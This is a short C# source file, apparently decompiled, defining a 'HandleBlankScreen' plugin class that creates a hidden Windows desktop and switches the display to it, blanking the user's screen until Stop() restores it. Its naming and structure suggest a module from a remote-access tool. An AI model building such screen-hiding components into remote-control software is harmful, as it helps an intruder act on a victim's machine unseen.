using System;

namespace Plugin.Handler;

public class HandleBlankScreen
{
	private enum DESKTOP_ACCESS : uint
	{
		DESKTOP_NONE = 0u,
		DESKTOP_READOBJECTS = 1u,
		DESKTOP_CREATEWINDOW = 2u,
		DESKTOP_CREATEMENU = 4u,
		DESKTOP_HOOKCONTROL = 8u,
		DESKTOP_JOURNALRECORD = 16u,
		DESKTOP_JOURNALPLAYBACK = 32u,
		DESKTOP_ENUMERATE = 64u,
		DESKTOP_WRITEOBJECTS = 128u,
		DESKTOP_SWITCHDESKTOP = 256u,
		GENERIC_ALL = 511u
	}

	public readonly IntPtr hOldDesktop = Native.GetThreadDesktop(Native.GetCurrentThreadId());

	public IntPtr hNewDesktop = Native.CreateDesktop("RandomDesktopName", IntPtr.Zero, IntPtr.Zero, 0, 511u, IntPtr.Zero);

	public void Run()
	{
		try
		{
			Native.SwitchDesktop(hNewDesktop);
		}
		catch
		{
		}
	}

	public void Stop()
	{
		try
		{
			Native.SwitchDesktop(hOldDesktop);
		}
		catch
		{
		}
	}
}
